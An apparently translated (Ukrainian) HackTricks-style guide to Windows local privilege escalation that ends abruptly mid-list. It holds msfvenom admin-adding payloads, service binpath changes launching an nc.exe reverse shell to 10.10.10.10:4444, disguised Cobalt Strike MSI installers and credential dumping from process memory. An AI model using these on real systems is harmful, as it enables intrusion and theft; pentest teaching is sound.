# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Access Tokens

**Якщо ви не знаєте, що таке Windows Access Tokens, прочитайте наступну сторінку перед продовженням:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наступну сторінку для отримання додаткової інформації про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Якщо ви не знаєте, що таке integrity levels in Windows, вам слід прочитати наступну сторінку перед продовженням:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Контролі безпеки Windows

У Windows існують різні речі, які можуть **перешкодити вам перерахувати систему**, завадити запуску виконуваних файлів або навіть **виявити вашу діяльність**. Ви повинні **прочитати** наступну **сторінку** та **перелічити** всі ці **захисні механізми** перед початком privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Інформація про систему

### Перевірка інформації про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте застосовані патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Цей [site](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4,700 вразливостей безпеки, що демонструє **massive attack surface**, яке становить середовище Windows.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені які-небудь credential/Juicy дані в env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Історія
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell файли транскрипту

Дізнатися, як це увімкнути, можна за адресою [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконання конвеєрів PowerShell записуються, включно з виконаними командами, викликами команд і частинами скриптів. Проте повні відомості про виконання та результати виводу можуть не зберігатися.

Щоб увімкнути це, дотримуйтесь інструкцій у розділі "Transcript files" документації, обравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій у PowersShell logs, виконайте:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Фіксується повний запис активності та вміст виконання скрипта, що забезпечує документування кожного блоку коду під час його виконання. Цей процес зберігає повний журнал аудиту кожної дії, корисний для судової експертизи та аналізу шкідливої поведінки. Документуючи всю активність у момент виконання, він дає детальне розуміння процесу.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Журнали подій для Script Block можна знайти в Переглядачі подій Windows за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Почніть із перевірки, чи мережа використовує non-SSL WSUS update, виконавши у cmd наступне:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримаєте відповідь, таку як одна з наведених:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді, **вразливість експлуатована.** Якщо останній запис реєстру дорівнює 0, то запис WSUS буде проігнорований.

Для експлуатації цієї вразливості можна використовувати інструменти на кшталт: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це MiTM weaponized exploits scripts для ін’єкції 'fake' оновлень у non-SSL WSUS трафік.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, це недолік, який використовує цей баг:

> Якщо ми маємо можливість змінити проксі нашого локального користувача, і Windows Updates використовує проксі, сконфігурований у налаштуваннях Internet Explorer, то ми маємо можливість запустити [PyWSUS](https://github.com/GoSecure/pywsus) локально, щоб перехопити власний трафік і виконати код від імені підвищеного користувача на нашому вузлі.
>
> Більше того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми згенеруємо self-signed сертифікат для хоста WSUS і додамо цей сертифікат у сховище сертифікатів поточного користувача, ми зможемо перехопити як HTTP, так і HTTPS WSUS трафік. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки trust-on-first-use сертифіката. Якщо представлений сертифікат довірений користувачем і має правильний hostname, служба його прийме.

Ви можете експлуатувати цю вразливість за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли він стане доступним).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Багато enterprise agents відкривають localhost IPC інтерфейс і привілейований канал оновлень. Якщо enrollment можна примусити до сервера атакуючого і updater довіряє rogue root CA або слабким перевіркам підпису, локальний користувач може доставити шкідливий MSI, який служба SYSTEM встановить. Див. узагальнену техніку (на основі ланцюга Netskope stAgentSvc – CVE-2025-0309) тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Існує вразливість **local privilege escalation** у Windows **domain** середовищах за певних умов. Ці умови включають середовища, де **LDAP signing не примусово увімкнено,** користувачі мають self-rights, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** і можливість для користувачів створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **налаштувань за замовчуванням.**

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Для додаткової інформації про хід атаки див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 записи реєстру **увімкнені** (значення **0x1**), тоді користувачі з будь-якими правами можуть **встановлювати** (виконувати) `*.msi` файли як NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку, використовуючи модуль **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI бінарний файл для ескалації привілеїв. Цей скрипт записує попередньо скомпільований MSI-інсталятор, який запитує додавання користувача/групи (тому вам буде потрібен GIU доступ):
```
Write-UserAddMSI
```
Просто запустіть створений бінарний файл, щоб escalate privileges.

### MSI Wrapper

Прочитайте цей підручник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо ви **тільки** хочете **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у полі пошуку. Виберіть проект **Setup Wizard** і натисніть **Next**.
- Дайте проекту ім'я, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, поки не дійдете до кроку 3 з 4 (choose files to include). Натисніть **Add** і виберіть Beacon payload, який ви щойно згенерували. Потім натисніть **Finish**.
- Виділіть проект **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Є інші властивості, які можна змінити, наприклад **Author** та **Manufacturer**, що може зробити встановлений додаток більш правдоподібним.
- Клацніть правою кнопкою миші на проекті та виберіть **View > Custom Actions**.
- Клацніть правою кнопкою на **Install** і виберіть **Add Custom Action**.
- Двічі клацніть на **Application Folder**, виберіть ваш файл **beacon.exe** і натисніть **OK**. Це гарантує, що beacon payload буде виконаний одразу після запуску інсталятора.
- В розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **build it**.
- Якщо з'явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу на x64.

### MSI Installation

Щоб виконати **інсталяцію** шкідливого `.msi` файлу у **фоновому режимі:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, ви можете використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та детектори

### Налаштування аудиту

Ці налаштування визначають, що **реєструється**, тому варто звернути на це увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, цікаво знати, куди надсилаються logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування локальними паролями облікового запису Administrator**, забезпечуючи, що кожен пароль є **унікальним, випадковим і регулярно оновлюється** на комп'ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory і доступні лише користувачам, яким через ACLs надано відповідні дозволи, що дозволяє їм переглядати локальні паролі адміністратора, якщо вони уповноважені.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активовано, **паролі у відкритому вигляді зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист для Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати його пам'ять** або впроваджувати код, додатково захищаючи систему.\  
[**Докладніше про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Вона призначена для захисту credentials, збережених на пристрої, від загроз, таких як атаки типу pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority (LSA)** і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай встановлюються доменні облікові дані.\
[**Детальніше про Cached Credentials тут**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перелічення користувачів і груп

Перевірте, чи мають які-небудь групи, до яких ви належите, цікаві дозволи.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до якоїсь привілейованої групи, ви можете підвищити свої привілеї**. Дізнайтеся про привілейовані групи та як зловживати ними, щоб підвищити свої привілеї тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Дізнайтеся більше** про те, що таке **token** на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** та як ними зловживати:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійшлі користувачі / сесії
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримати вміст буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

Перш за все, при переліченні процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати будь-який запущений бінарний файл** або чи маєте права запису в папку з бінарними файлами, щоб експлуатувати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність можливих [**electron/cef/chromium debuggers** — якщо вони запущені, їх можна використати для ескалації привілеїв](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Ви можете створити дамп пам'яті запущеного процесу, використовуючи **procdump** з sysinternals. Сервіси, як FTP, мають **credentials у відкритому тексті в пам'яті**, спробуйте зняти дамп пам'яті і прочитати credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-застосунки

**Застосунки, що запускаються від імені SYSTEM, можуть дозволити користувачу відкрити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), знайдіть "command prompt", натисніть "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Навіть без прав SERVICE_START ви часто можете запустити привілейовані служби, активувавши їхні тригери. Див. методи перерахування та активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати виконуваний файл **accesschk** від _Sysinternals_ для перевірки необхідного рівня привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнути службу

Якщо у вас виникає ця помилка (наприклад зі SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Ви можете увімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що служба upnphost залежить від SSDPSRV для роботи (для XP SP1)**

**Інший обхідний шлях** цієї проблеми — запустити:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

У випадку, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можлива модифікація виконуваного бінарного файлу служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапустити службу
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Права можна підвищити через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштування бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи доступу, що в підсумку дозволяє змінювати конфігурації служби.
- **WRITE_OWNER**: Дозволяє змінити власника і переналаштувати дозволи.
- **GENERIC_WRITE**: Надає можливість змінювати конфігурації служби.
- **GENERIC_ALL**: Також надає можливість змінювати конфігурації служби.

Для виявлення та експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.

### Слабкі дозволи бінарних файлів служб

**Перевірте, чи можете змінити бінарний файл, який виконується сервісом** або якщо ви маєте **права на запис у папці**, де знаходиться бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати список усіх бінарних файлів, які виконує служба, за допомогою **wmic** (не в system32) і перевірити свої дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ви також можете використовувати **sc** та **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Зміни дозволів у реєстрі служб

Вам слід перевірити, чи можете ви змінити будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** щодо **реєстру служб**, виконавши:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Необхідно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який виконується службою, можна змінити.

Щоб змінити Path виконуваного бінарного файлу:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Дозволи AppendData/AddSubdirectory у реєстрі сервісів

Якщо у вас є цей дозвіл над реєстром, це означає, що **ви можете створювати підреєстри з цього**. У випадку Windows services це **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи сервісів без лапок

Якщо шлях до виконуваного файлу не укладено в лапки, Windows спробує виконати кожну частину шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі нецитовані шляхи служб, за винятком тих, що належать вбудованим службам Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Ви можете виявити та експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарник служби за допомогою metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Дії відновлення

Windows дозволяє вказувати дії, які виконуватимуться у разі збою служби. Цю можливість можна налаштувати так, щоб вона вказувала на binary. Якщо цей binary можна замінити, можлива privilege escalation. Більше деталей можна знайти в [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Додатки

### Встановлені програми

Перевірте **permissions of the binaries** (можливо, ви зможете перезаписати один і escalate privileges) та **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Права на запис

Перевірте, чи можете змінити якийсь конфігураційний файл, щоб прочитати якийсь спеціальний файл, або чи можете змінити бінарний файл, який буде виконаний під обліковим записом Administrator (schedtasks).

Один зі способів знайти слабкі права доступу до папок/файлів у системі — зробити:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Запуск під час завантаження

**Перевірте, чи можете перезаписати певний registry або binary, який буде виконаний іншим user.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте можливі **third party weird/vulnerable** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Сучасні hive-вразливості дозволяють підготувати детерміновані layouts, зловживати writable HKLM/HKU descendants і перетворювати metadata corruption у kernel paged-pool overflows без custom driver. Дізнайтеся повний ланцюжок тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Деякі signed third‑party drivers створюють свій device object зі строгим SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапора secure DACL не застосовується, коли device відкривається через шлях, що містить додатковий компонент, що дозволяє будь-якому непідпривілейованому користувачеві отримати handle, використовуючи namespace path, наприклад:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Після того, як користувач може відкрити device, привілейовані IOCTLs, які експонує driver, можуть бути використані для LPE та tampering. Приклади можливостей, спостережених in the wild:
- Повернути full-access handles до arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
